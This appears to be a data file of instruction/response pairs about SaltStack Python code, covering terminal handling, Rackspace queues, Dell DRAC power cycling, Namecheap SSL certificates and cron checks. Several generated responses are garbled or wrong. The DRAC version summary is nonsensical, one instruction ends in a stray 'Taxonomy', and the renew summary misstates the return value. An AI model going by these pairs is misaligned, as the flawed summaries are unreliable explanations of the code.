{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nclean up any remaining terminal processes that are still running.", "response": "def _cleanup():\n    '''\n    Make sure that any terminal processes still running when __del__ was called\n    to the waited and cleaned up.\n    '''\n    for inst in _ACTIVE[:]:\n        res = inst.isalive()\n        if res is not True:\n            try:\n                _ACTIVE.remove(inst)\n            except ValueError:\n                # This can happen if two threads create a new Terminal instance\n                # It's harmless that it was already removed, so ignore.\n                pass"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef sendline(self, data, linesep=os.linesep):\n        '''\n        Send the provided data to the terminal appending a line feed.\n        '''\n        return self.send('{0}{1}'.format(data, linesep))", "response": "Send the provided data to the terminal appending a line feed."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreceiving data from the terminal as a tuple.", "response": "def recv(self, maxsize=None):\n        '''\n        Receive data from the terminal as a (``stdout``, ``stderr``) tuple. If\n        any of those is ``None`` we can no longer communicate with the\n        terminal's child process.\n        '''\n        if maxsize is None:\n            maxsize = 1024\n        elif maxsize < 1:\n            maxsize = 1\n        return self._recv(maxsize)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef close(self, terminate=True, kill=False):\n        '''\n        Close the communication with the terminal's child.\n        If ``terminate`` is ``True`` then additionally try to terminate the\n        terminal, and if ``kill`` is also ``True``, kill the terminal if\n        terminating it was not enough.\n        '''\n        if not self.closed:\n            if self.child_fd is not None:\n                os.close(self.child_fd)\n                self.child_fd = None\n            if self.child_fde is not None:\n                os.close(self.child_fde)\n                self.child_fde = None\n            time.sleep(0.1)\n            if terminate:\n                if not self.terminate(kill):\n                    raise TerminalException('Failed to terminate child process.')\n            self.closed = True", "response": "Close the communication with the terminal s child."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef present(name, provider):\n    '''\n    Ensure the RackSpace queue exists.\n\n    name\n        Name of the Rackspace queue.\n\n    provider\n        Salt Cloud Provider\n    '''\n    ret = {'name': name, 'result': True, 'comment': '', 'changes': {}}\n\n    is_present = list(__salt__['cloud.action']('queues_exists', provider=provider, name=name)[provider].values())[0]\n\n    if not is_present:\n        if __opts__['test']:\n            msg = 'Rackspace queue {0} is set to be created.'.format(name)\n            ret['comment'] = msg\n            ret['result'] = None\n            return ret\n        created = __salt__['cloud.action']('queues_create', provider=provider, name=name)\n        if created:\n            queue = __salt__['cloud.action']('queues_show', provider=provider, name=name)\n            ret['changes']['old'] = {}\n            ret['changes']['new'] = {'queue': queue}\n        else:\n            ret['result'] = False\n            ret['comment'] = 'Failed to create {0} Rackspace queue.'.format(name)\n            return ret\n    else:\n        ret['comment'] = '{0} present.'.format(name)\n\n    return ret", "response": "Ensure the Rackspace queue exists."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nensuring the named Rackspace queue is deleted.", "response": "def absent(name, provider):\n    '''\n    Ensure the named Rackspace queue is deleted.\n\n    name\n        Name of the Rackspace queue.\n\n    provider\n        Salt Cloud provider\n    '''\n    ret = {'name': name, 'result': True, 'comment': '', 'changes': {}}\n\n    is_present = list(__salt__['cloud.action']('queues_exists', provider=provider, name=name)[provider].values())[0]\n\n    if is_present:\n        if __opts__['test']:\n            ret['comment'] = 'Rackspace queue {0} is set to be removed.'.format(\n                name)\n            ret['result'] = None\n            return ret\n        queue = __salt__['cloud.action']('queues_show', provider=provider, name=name)\n        deleted = __salt__['cloud.action']('queues_delete', provider=provider, name=name)\n        if deleted:\n            ret['changes']['old'] = queue\n            ret['changes']['new'] = {}\n        else:\n            ret['result'] = False\n            ret['comment'] = 'Failed to delete {0} Rackspace queue.'.format(name)\n    else:\n        ret['comment'] = '{0} does not exist.'.format(name)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef __connect(hostname, timeout=20, username=None, password=None):\n    '''\n    Connect to the DRAC\n    '''\n    drac_cred = __opts__.get('drac')\n    err_msg = 'No drac login credentials found. Please add the \\'username\\' and \\'password\\' ' \\\n              'fields beneath a \\'drac\\' key in the master configuration file. Or you can ' \\\n              'pass in a username and password as kwargs at the CLI.'\n\n    if not username:\n        if drac_cred is None:\n            log.error(err_msg)\n            return False\n        username = drac_cred.get('username', None)\n    if not password:\n        if drac_cred is None:\n            log.error(err_msg)\n            return False\n        password = drac_cred.get('password', None)\n\n    client = paramiko.SSHClient()\n    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\n    try:\n        client.connect(hostname, username=username, password=password, timeout=timeout)\n    except Exception as e:\n        log.error('Unable to connect to %s: %s', hostname, e)\n        return False\n\n    return client", "response": "Connect to the DRAC\n   "}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets DRAC version of the current DRAC.", "response": "def __version(client):\n    '''\n    Grab DRAC version\n    '''\n    versions = {9: 'CMC',\n                8: 'iDRAC6',\n                10: 'iDRAC6',\n                11: 'iDRAC6',\n                16: 'iDRAC7',\n                17: 'iDRAC7'}\n\n    if isinstance(client, paramiko.SSHClient):\n        (stdin, stdout, stderr) = client.exec_command('racadm getconfig -g idRacInfo')\n\n        for i in stdout.readlines():\n            if i[2:].startswith('idRacType'):\n                return versions.get(int(i[2:].split('=')[1]), None)\n\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nconnecting to the Dell DRAC and power cycle the system to PXE boot Taxonomy", "response": "def pxe(hostname, timeout=20, username=None, password=None):\n    '''\n    Connect to the Dell DRAC and have the boot order set to PXE\n    and power cycle the system to PXE boot\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-run drac.pxe example.com\n    '''\n    _cmds = [\n        'racadm config -g cfgServerInfo -o cfgServerFirstBootDevice pxe',\n        'racadm config -g cfgServerInfo -o cfgServerBootOnce 1',\n        'racadm serveraction powercycle',\n    ]\n\n    client = __connect(hostname, timeout, username, password)\n\n    if isinstance(client, paramiko.SSHClient):\n        for i, cmd in enumerate(_cmds, 1):\n            log.info('Executing command %s', i)\n\n            (stdin, stdout, stderr) = client.exec_command(cmd)\n\n        if 'successful' in stdout.readline():\n            log.info('Executing command: %s', cmd)\n        else:\n            log.error('Unable to execute: %s', cmd)\n            return False\n\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef version(hostname, timeout=20, username=None, password=None):\n    '''\n    Display the version of DRAC\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-run drac.version example.com\n    '''\n    return __version(__connect(hostname, timeout, username, password))", "response": "Display the version of DRAC\n        CLI Example : DRAC\n getTerminal version of DRAC\n getTerminal"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nemits the status of a connected display to the minion", "response": "def beacon(config):\n    '''\n    Emit the status of a connected display to the minion\n\n    Mainly this is used to detect when the display fails to connect\n    for whatever reason.\n\n    .. code-block:: yaml\n\n        beacons:\n          glxinfo:\n            - user: frank\n            - screen_event: True\n\n    '''\n\n    log.trace('glxinfo beacon starting')\n    ret = []\n\n    _config = {}\n    list(map(_config.update, config))\n\n    retcode = __salt__['cmd.retcode']('DISPLAY=:0 glxinfo',\n                                      runas=_config['user'], python_shell=True)\n\n    if 'screen_event' in _config and _config['screen_event']:\n        last_value = last_state.get('screen_available', False)\n        screen_available = retcode == 0\n        if last_value != screen_available or 'screen_available' not in last_state:\n            ret.append({'tag': 'screen_event', 'screen_available': screen_available})\n\n        last_state['screen_available'] = screen_available\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets a master config option", "response": "def get(key, default='', delimiter=':'):\n    '''\n    Retrieve master config options, with optional nesting via the delimiter\n    argument.\n\n    **Arguments**\n\n    default\n\n        If the key is not found, the default will be returned instead\n\n    delimiter\n\n        Override the delimiter used to separate nested levels of a data\n        structure.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-run config.get gitfs_remotes\n        salt-run config.get file_roots:base\n        salt-run config.get file_roots,base delimiter=','\n    '''\n    ret = salt.utils.data.traverse_dict_and_list(__opts__, key, default='_|-', delimiter=delimiter)\n    if ret == '_|-':\n        return default\n    else:\n        return salt.utils.sdb.sdb_get(ret, __opts__)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef reissue(csr_file,\n            certificate_id,\n            web_server_type,\n            approver_email=None,\n            http_dc_validation=False,\n            **kwargs):\n    '''\n    Reissues a purchased SSL certificate. Returns a dictionary of result\n    values.\n\n    csr_file\n        Path to Certificate Signing Request file\n\n    certificate_id\n        Unique ID of the SSL certificate you wish to activate\n\n    web_server_type\n        The type of certificate format to return. Possible values include:\n\n        - apache2\n        - apacheapachessl\n        - apacheopenssl\n        - apacheraven\n        - apachessl\n        - apachessleay\n        - c2net\n        - cobaltseries\n        - cpanel\n        - domino\n        - dominogo4625\n        - dominogo4626\n        - ensim\n        - hsphere\n        - ibmhttp\n        - iis\n        - iis4\n        - iis5\n        - iplanet\n        - ipswitch\n        - netscape\n        - other\n        - plesk\n        - tomcat\n        - weblogic\n        - website\n        - webstar\n        - zeusv3\n\n    approver_email\n        The email ID which is on the approver email list.\n\n        .. note::\n            ``http_dc_validation`` must be set to ``False`` if this option is\n            used.\n\n    http_dc_validation : False\n        Whether or not to activate using HTTP-based validation.\n\n    .. note::\n        For other parameters which may be required, see here__.\n\n        .. __: https://www.namecheap.com/support/api/methods/ssl/reissue.aspx\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt 'my-minion' namecheap_ssl.reissue my-csr-file my-cert-id apachessl\n    '''\n    return __get_certificates('namecheap.ssl.reissue', \"SSLReissueResult\", csr_file, certificate_id, web_server_type,\n                              approver_email, http_dc_validation, kwargs)", "response": "Reissues a purchased SSL certificate. Returns a dictionary of result\n    values.\n\n    csr_file\n        Path to Certificate Signing Request file\n\n    certificate_id\n        Unique ID of the SSL certificate you wish to activate\n\n    web_server_type\n        The type of certificate format to return. Possible values include:\n\n        - apache2\n        - apacheapachessl\n        - apacheopenssl\n        - apacheraven\n        - apachessl\n        - apachessleay\n        - c2net\n        - cobaltseries\n        - cpanel\n        - domino\n        - dominogo4625\n        - dominogo4626\n        - ensim\n        - hsphere\n        - ibmhttp\n        - iis\n        - iis4\n        - iis5\n        - iplanet\n        - ipswitch\n        - netscape\n        - other\n        - plesk\n        - tomcat\n        - weblogic\n        - website\n        - webstar\n        - zeusv3\n\n    approver_email\n        The email ID which is on the approver email list.\n\n        .. note::\n            ``http_dc_validation`` must be set to ``False`` if this option is\n            used.\n\n    http_dc_validation : False\n        Whether or not to activate using HTTP-based validation.\n\n    .. note::\n        For other parameters which may be required, see here__.\n\n        .. __: https://www.namecheap.com/support/api/methods/ssl/reissue.aspx\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt 'my-minion' namecheap_ssl.reissue my-csr-file my-cert-id apachessl"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef renew(years, certificate_id, certificate_type, promotion_code=None):\n    '''\n    Renews an SSL certificate if it is ACTIVE and Expires <= 30 days. Returns\n    the following information:\n\n    - The certificate ID\n    - The order ID\n    - The transaction ID\n    - The amount charged for the order\n\n    years : 1\n        Number of years to register\n\n    certificate_id\n        Unique ID of the SSL certificate you wish to renew\n\n    certificate_type\n        Type of SSL Certificate. Possible values include:\n\n        - EV Multi Domain SSL\n        - EV SSL\n        - EV SSL SGC\n        - EssentialSSL\n        - EssentialSSL Wildcard\n        - InstantSSL\n        - InstantSSL Pro\n        - Multi Domain SSL\n        - PositiveSSL\n        - PositiveSSL Multi Domain\n        - PositiveSSL Wildcard\n        - PremiumSSL\n        - PremiumSSL Wildcard\n        - QuickSSL Premium\n        - RapidSSL\n        - RapidSSL Wildcard\n        - SGC Supercert\n        - SSL Web Server\n        - SSL Webserver EV\n        - SSL123\n        - Secure Site\n        - Secure Site Pro\n        - Secure Site Pro with EV\n        - Secure Site with EV\n        - True BusinessID\n        - True BusinessID Multi Domain\n        - True BusinessID Wildcard\n        - True BusinessID with EV\n        - True BusinessID with EV Multi Domain\n        - Unified Communications\n\n    promotional_code\n        An optional promo code to use when renewing the certificate\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt 'my-minion' namecheap_ssl.renew 1 my-cert-id RapidSSL\n    '''\n\n    valid_certs = ('QuickSSL Premium',\n                   'RapidSSL',\n                   'RapidSSL Wildcard',\n                   'PremiumSSL',\n                   'InstantSSL',\n                   'PositiveSSL',\n                   'PositiveSSL Wildcard',\n                   'True BusinessID with EV',\n                   'True BusinessID',\n                   'True BusinessID Wildcard',\n                   'True BusinessID Multi Domain',\n                   'True BusinessID with EV Multi Domain',\n                   'Secure Site',\n                   'Secure Site Pro',\n                   'Secure Site with EV',\n                   'Secure Site Pro with EV',\n                   'EssentialSSL',\n                   'EssentialSSL Wildcard',\n                   'InstantSSL Pro',\n                   'PremiumSSL Wildcard',\n                   'EV SSL',\n                   'EV SSL SGC',\n                   'SSL123',\n                   'SSL Web Server',\n                   'SGC Supercert',\n                   'SSL Webserver EV',\n                   'EV Multi Domain SSL',\n                   'Multi Domain SSL',\n                   'PositiveSSL Multi Domain',\n                   'Unified Communications',\n                   )\n\n    if certificate_type not in valid_certs:\n        log.error('Invalid option for certificate_type=%s', certificate_type)\n        raise Exception('Invalid option for certificate_type=' + certificate_type)\n\n    if years < 1 or years > 5:\n        log.error('Invalid option for years=%s', years)\n        raise Exception('Invalid option for years=' + six.text_type(years))\n\n    opts = salt.utils.namecheap.get_opts('namecheap.ssl.renew')\n    opts['Years'] = six.text_type(years)\n    opts['CertificateID'] = six.text_type(certificate_id)\n    opts['SSLType'] = certificate_type\n    if promotion_code is not None:\n        opts['PromotionCode'] = promotion_code\n\n    response_xml = salt.utils.namecheap.post_request(opts)\n    if response_xml is None:\n        return {}\n\n    sslrenewresult = response_xml.getElementsByTagName('SSLRenewResult')[0]\n    return salt.utils.namecheap.atts_to_dict(sslrenewresult)", "response": "renews an SSL certificate if it is ACTIVE and Expires < 30 days. Returns the new SSL certificate."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef create(years, certificate_type, promotion_code=None, sans_to_add=None):\n    '''\n    Creates a new SSL certificate. Returns the following information:\n\n    - Whether or not the SSL order was successful\n    - The certificate ID\n    - The order ID\n    - The transaction ID\n    - The amount charged for the order\n    - The date on which the certificate was created\n    - The date on which the certificate will expire\n    - The type of SSL certificate\n    - The number of years for which the certificate was purchased\n    - The current status of the SSL certificate\n\n    years : 1\n        Number of years to register\n\n    certificate_type\n        Type of SSL Certificate. Possible values include:\n\n        - EV Multi Domain SSL\n        - EV SSL\n        - EV SSL SGC\n        - EssentialSSL\n        - EssentialSSL Wildcard\n        - InstantSSL\n        - InstantSSL Pro\n        - Multi Domain SSL\n        - PositiveSSL\n        - PositiveSSL Multi Domain\n        - PositiveSSL Wildcard\n        - PremiumSSL\n        - PremiumSSL Wildcard\n        - QuickSSL Premium\n        - RapidSSL\n        - RapidSSL Wildcard\n        - SGC Supercert\n        - SSL Web Server\n        - SSL Webserver EV\n        - SSL123\n        - Secure Site\n        - Secure Site Pro\n        - Secure Site Pro with EV\n        - Secure Site with EV\n        - True BusinessID\n        - True BusinessID Multi Domain\n        - True BusinessID Wildcard\n        - True BusinessID with EV\n        - True BusinessID with EV Multi Domain\n        - Unified Communications\n\n    promotional_code\n        An optional promo code to use when creating the certificate\n\n    sans_to_add : 0\n        This parameter defines the number of add-on domains to be purchased in\n        addition to the default number of domains included with a multi-domain\n        certificate. Each certificate that supports SANs has the default number\n        of domains included. You may check the default number of domains\n        included and the maximum number of domains that can be added to it in\n        the table below.\n\n    +----------+----------------+----------------------+-------------------+----------------+\n    | Provider | Product name   | Default number of    | Maximum number of | Maximum number |\n    |          |                | domains (domain from | total domains     | of domains     |\n    |          |                | CSR is counted here) |                   | that can be    |\n    |          |                |                      |                   | passed in      |\n    |          |                |                      |                   | sans_to_add    |\n    |          |                |                      |                   | parameter      |\n    +----------+----------------+----------------------+-------------------+----------------+\n    | Comodo   | PositiveSSL    | 3                    | 100               | 97             |\n    |          | Multi-Domain   |\t\t       |                   |                |\n    +----------+----------------+----------------------+-------------------+----------------+\n    | Comodo   | Multi-Domain   | 3                    | 100               | 97   \t    |\n    |          | SSL            |\t\t       |                   |\t\t    |\n    +----------+----------------+----------------------+-------------------+----------------+\n    | Comodo   | EV Multi-      | 3                    | 100               | 97             |\n    |          | Domain SSL     |\t\t       |                   |                |\n    +----------+----------------+----------------------+-------------------+----------------+\n    | Comodo   | Unified        | 3                    | 100               | 97             |\n    |          | Communications |                      |  \t\t   |                |\n    +----------+----------------+----------------------+-------------------+----------------+\n    | GeoTrust | QuickSSL       | 1                    | 1 domain +        | The only       |\n    |          | Premium        |                      | 4 subdomains      | supported      |\n    |          |                |                      |                   | value is 4     |\n    +----------+----------------+----------------------+-------------------+----------------+\n    | GeoTrust | True           | 5                    | 25                | 20             |\n    |          | BusinessID     |                      |\t\t   |                |\n    |          | with EV        |                      |                   |                |\n    |          | Multi-Domain   |                      |                   |                |\n    +----------+----------------+----------------------+-------------------+----------------+\n    | GeoTrust | True Business  | 5                    | 25                | 20             |\n    |          | ID Multi-      |                      |                   |                |\n    |          | Domain         |                      |                   |                |\n    +----------+----------------+----------------------+-------------------+----------------+\n    | Thawte   | SSL Web        | 1                    | 25                | 24             |\n    |          | Server         |                      |                   |                |\n    +----------+----------------+----------------------+-------------------+----------------+\n    | Thawte   | SSL Web        | 1                    | 25                | 24             |\n    |          | Server with    |                      |                   |                |\n    |          | EV             |                      |                   |                |\n    +----------+----------------+----------------------+-------------------+----------------+\n    | Thawte   | SGC Supercerts | 1                    | 25                | 24             |\n    +----------+----------------+----------------------+-------------------+----------------+\n    | Symantec | Secure Site    | 1                    | 25                | 24             |\n    |          | Pro with EV    |                      |                   |                |\n    +----------+----------------+----------------------+-------------------+----------------+\n    | Symantec | Secure Site    | 1                    | 25                | 24             |\n    |          | with EV        |                      |                   |                |\n    +----------+----------------+----------------------+-------------------+----------------+\n    | Symantec | Secure Site    | 1                    | 25                | 24             |\n    +----------+----------------+----------------------+-------------------+----------------+\n    | Symantec | Secure Site    | 1                    | 25                | 24             |\n    |          | Pro            |                      |                   |                |\n    +----------+----------------+----------------------+-------------------+----------------+\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt 'my-minion' namecheap_ssl.create 2 RapidSSL\n    '''\n    valid_certs = ('QuickSSL Premium',\n                   'RapidSSL',\n                   'RapidSSL Wildcard',\n                   'PremiumSSL',\n                   'InstantSSL',\n                   'PositiveSSL',\n                   'PositiveSSL Wildcard',\n                   'True BusinessID with EV',\n                   'True BusinessID',\n                   'True BusinessID Wildcard',\n                   'True BusinessID Multi Domain',\n                   'True BusinessID with EV Multi Domain',\n                   'Secure Site',\n                   'Secure Site Pro',\n                   'Secure Site with EV',\n                   'Secure Site Pro with EV',\n                   'EssentialSSL',\n                   'EssentialSSL Wildcard',\n                   'InstantSSL Pro',\n                   'PremiumSSL Wildcard',\n                   'EV SSL',\n                   'EV SSL SGC',\n                   'SSL123',\n                   'SSL Web Server',\n                   'SGC Supercert',\n                   'SSL Webserver EV',\n                   'EV Multi Domain SSL',\n                   'Multi Domain SSL',\n                   'PositiveSSL Multi Domain',\n                   'Unified Communications',\n                   )\n\n    if certificate_type not in valid_certs:\n        log.error('Invalid option for certificate_type=%s', certificate_type)\n        raise Exception('Invalid option for certificate_type=' + certificate_type)\n\n    if years < 1 or years > 5:\n        log.error('Invalid option for years=%s', years)\n        raise Exception('Invalid option for years=' + six.text_type(years))\n\n    opts = salt.utils.namecheap.get_opts('namecheap.ssl.create')\n\n    opts['Years'] = years\n    opts['Type'] = certificate_type\n    if promotion_code is not None:\n        opts['PromotionCode'] = promotion_code\n    if sans_to_add is not None:\n        opts['SANStoADD'] = sans_to_add\n\n    response_xml = salt.utils.namecheap.post_request(opts)\n    if response_xml is None:\n        return {}\n\n    sslcreateresult = response_xml.getElementsByTagName('SSLCreateResult')[0]\n    sslcertinfo = sslcreateresult.getElementsByTagName('SSLCertificate')[0]\n\n    result = salt.utils.namecheap.atts_to_dict(sslcreateresult)\n    result.update(salt.utils.namecheap.atts_to_dict(sslcertinfo))\n    return result", "response": "Creates a new SSL certificate in the specified number of years and certificate type."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef parse_csr(csr_file, certificate_type, http_dc_validation=False):\n    '''\n    Parses the CSR. Returns a dictionary of result values.\n\n    csr_file\n        Path to Certificate Signing Request file\n\n    certificate_type\n        Type of SSL Certificate. Possible values include:\n\n        - EV Multi Domain SSL\n        - EV SSL\n        - EV SSL SGC\n        - EssentialSSL\n        - EssentialSSL Wildcard\n        - InstantSSL\n        - InstantSSL Pro\n        - Multi Domain SSL\n        - PositiveSSL\n        - PositiveSSL Multi Domain\n        - PositiveSSL Wildcard\n        - PremiumSSL\n        - PremiumSSL Wildcard\n        - QuickSSL Premium\n        - RapidSSL\n        - RapidSSL Wildcard\n        - SGC Supercert\n        - SSL Web Server\n        - SSL Webserver EV\n        - SSL123\n        - Secure Site\n        - Secure Site Pro\n        - Secure Site Pro with EV\n        - Secure Site with EV\n        - True BusinessID\n        - True BusinessID Multi Domain\n        - True BusinessID Wildcard\n        - True BusinessID with EV\n        - True BusinessID with EV Multi Domain\n        - Unified Communications\n\n    http_dc_validation : False\n        Set to ``True`` if a Comodo certificate and validation should be\n        done with files instead of emails and to return the info to do so\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt 'my-minion' namecheap_ssl.parse_csr my-csr-file PremiumSSL\n    '''\n    valid_certs = ('QuickSSL Premium',\n                   'RapidSSL',\n                   'RapidSSL Wildcard',\n                   'PremiumSSL',\n                   'InstantSSL',\n                   'PositiveSSL',\n                   'PositiveSSL Wildcard',\n                   'True BusinessID with EV',\n                   'True BusinessID',\n                   'True BusinessID Wildcard',\n                   'True BusinessID Multi Domain',\n                   'True BusinessID with EV Multi Domain',\n                   'Secure Site',\n                   'Secure Site Pro',\n                   'Secure Site with EV',\n                   'Secure Site Pro with EV',\n                   'EssentialSSL',\n                   'EssentialSSL Wildcard',\n                   'InstantSSL Pro',\n                   'PremiumSSL Wildcard',\n                   'EV SSL',\n                   'EV SSL SGC',\n                   'SSL123',\n                   'SSL Web Server',\n                   'SGC Supercert',\n                   'SSL Webserver EV',\n                   'EV Multi Domain SSL',\n                   'Multi Domain SSL',\n                   'PositiveSSL Multi Domain',\n                   'Unified Communications',\n                   )\n\n    if certificate_type not in valid_certs:\n        log.error('Invalid option for certificate_type=%s', certificate_type)\n        raise Exception('Invalid option for certificate_type=' + certificate_type)\n\n    opts = salt.utils.namecheap.get_opts('namecheap.ssl.parseCSR')\n\n    with salt.utils.files.fopen(csr_file, 'rb') as csr_handle:\n        opts['csr'] = salt.utils.stringutils.to_unicode(\n            csr_handle.read()\n        )\n\n    opts['CertificateType'] = certificate_type\n    if http_dc_validation:\n        opts['HTTPDCValidation'] = 'true'\n\n    response_xml = salt.utils.namecheap.post_request(opts)\n\n    sslparseresult = response_xml.getElementsByTagName('SSLParseCSRResult')[0]\n\n    return salt.utils.namecheap.xml_to_dict(sslparseresult)", "response": "Parses a CSR file and returns a dictionary of result values."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a list of SSL certificates for a particular user.", "response": "def get_list(**kwargs):\n    '''\n    Returns a list of SSL certificates for a particular user\n\n    ListType : All\n        Possible values:\n\n        - All\n        - Processing\n        - EmailSent\n        - TechnicalProblem\n        - InProgress\n        - Completed\n        - Deactivated\n        - Active\n        - Cancelled\n        - NewPurchase\n        - NewRenewal\n\n        SearchTerm\n            Keyword to look for on the SSL list\n\n        Page : 1\n            Page number to return\n\n        PageSize : 20\n            Total number of SSL certificates to display per page (minimum:\n            ``10``, maximum: ``100``)\n\n        SoryBy\n            One of ``PURCHASEDATE``, ``PURCHASEDATE_DESC``, ``SSLTYPE``,\n            ``SSLTYPE_DESC``, ``EXPIREDATETIME``, ``EXPIREDATETIME_DESC``,\n            ``Host_Name``, or ``Host_Name_DESC``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt 'my-minion' namecheap_ssl.get_list Processing\n    '''\n    opts = salt.utils.namecheap.get_opts('namecheap.ssl.getList')\n    for key, value in six.iteritems(kwargs):\n        opts[key] = value\n\n    response_xml = salt.utils.namecheap.get_request(opts)\n\n    if response_xml is None:\n        return []\n\n    ssllistresult = response_xml.getElementsByTagName('SSLListResult')[0]\n\n    result = []\n    for e in ssllistresult.getElementsByTagName('SSL'):\n        ssl = salt.utils.namecheap.atts_to_dict(e)\n        result.append(ssl)\n\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nget information about the requested SSL certificate.", "response": "def get_info(certificate_id, returncertificate=False, returntype=None):\n    '''\n    Retrieves information about the requested SSL certificate. Returns a\n    dictionary of information about the SSL certificate with two keys:\n\n    - **ssl** - Contains the metadata information\n    - **certificate** - Contains the details for the certificate such as the\n      CSR, Approver, and certificate data\n\n    certificate_id\n        Unique ID of the SSL certificate\n\n    returncertificate : False\n        Set to ``True`` to ask for the certificate in response\n\n    returntype\n        Optional type for the returned certificate. Can be either \"Individual\"\n        (for X.509 format) or \"PKCS7\"\n\n        .. note::\n            Required if ``returncertificate`` is ``True``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt 'my-minion' namecheap_ssl.get_info my-cert-id\n    '''\n    opts = salt.utils.namecheap.get_opts('namecheap.ssl.getinfo')\n    opts['certificateID'] = certificate_id\n\n    if returncertificate:\n        opts['returncertificate'] = \"true\"\n        if returntype is None:\n            log.error('returntype must be specified when returncertificate is set to True')\n            raise Exception('returntype must be specified when returncertificate is set to True')\n        if returntype not in [\"Individual\", \"PKCS7\"]:\n            log.error('returntype must be specified as Individual or PKCS7, not %s', returntype)\n            raise Exception('returntype must be specified as Individual or PKCS7, not ' + returntype)\n        opts['returntype'] = returntype\n\n    response_xml = salt.utils.namecheap.get_request(opts)\n\n    if response_xml is None:\n        return {}\n\n    sslinforesult = response_xml.getElementsByTagName('SSLGetInfoResult')[0]\n\n    return salt.utils.namecheap.xml_to_dict(sslinforesult)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _check_cron(user,\n                cmd,\n                minute=None,\n                hour=None,\n                daymonth=None,\n                month=None,\n                dayweek=None,\n                comment=None,\n                commented=None,\n                identifier=None,\n                special=None):\n    '''\n    Return the changes\n    '''\n    if minute is not None:\n        minute = six.text_type(minute).lower()\n    if hour is not None:\n        hour = six.text_type(hour).lower()\n    if daymonth is not None:\n        daymonth = six.text_type(daymonth).lower()\n    if month is not None:\n        month = six.text_type(month).lower()\n    if dayweek is not None:\n        dayweek = six.text_type(dayweek).lower()\n    if identifier is not None:\n        identifier = six.text_type(identifier)\n    if commented is not None:\n        commented = commented is True\n    if cmd is not None:\n        cmd = six.text_type(cmd)\n    lst = __salt__['cron.list_tab'](user)\n    if special is None:\n        for cron in lst['crons']:\n            if _cron_matched(cron, cmd, identifier):\n                if any([_needs_change(x, y) for x, y in\n                        ((cron['minute'], minute), (cron['hour'], hour),\n                         (cron['daymonth'], daymonth), (cron['month'], month),\n                         (cron['dayweek'], dayweek), (cron['identifier'], identifier),\n                         (cron['cmd'], cmd), (cron['comment'], comment),\n                         (cron['commented'], commented))]):\n                    return 'update'\n                return 'present'\n    else:\n        for cron in lst['special']:\n            if _cron_matched(cron, cmd, identifier):\n                if any([_needs_change(x, y) for x, y in\n                        ((cron['spec'], special),\n                         (cron['identifier'], identifier),\n                         (cron['cmd'], cmd),\n                         (cron['comment'], comment),\n                         (cron['commented'], commented))]):\n                    return 'update'\n                return 'present'\n    return 'absent'", "response": "Check if a user has a cron entry."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _check_cron_env(user,\n                    name,\n                    value=None):\n    '''\n    Return the environment changes\n    '''\n    if value is None:\n        value = \"\"  # Matching value set in salt.modules.cron._render_tab\n    lst = __salt__['cron.list_tab'](user)\n    for env in lst['env']:\n        if name == env['name']:\n            if value != env['value']:\n                return 'update'\n            return 'present'\n    return 'absent'", "response": "Check if the environment changes for a specific environment"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _get_cron_info():\n    '''\n    Returns the proper group owner and path to the cron directory\n    '''\n    owner = 'root'\n    if __grains__['os'] == 'FreeBSD':\n        group = 'wheel'\n        crontab_dir = '/var/cron/tabs'\n    elif __grains__['os'] == 'OpenBSD':\n        group = 'crontab'\n        crontab_dir = '/var/cron/tabs'\n    elif __grains__['os_family'] == 'Solaris':\n        group = 'root'\n        crontab_dir = '/var/spool/cron/crontabs'\n    elif __grains__['os'] == 'MacOS':\n        group = 'wheel'\n        crontab_dir = '/usr/lib/cron/tabs'\n    else:\n        group = 'root'\n        crontab_dir = '/var/spool/cron'\n    return owner, group, crontab_dir", "response": "Returns the proper group owner and path to the cron directory\n   "}
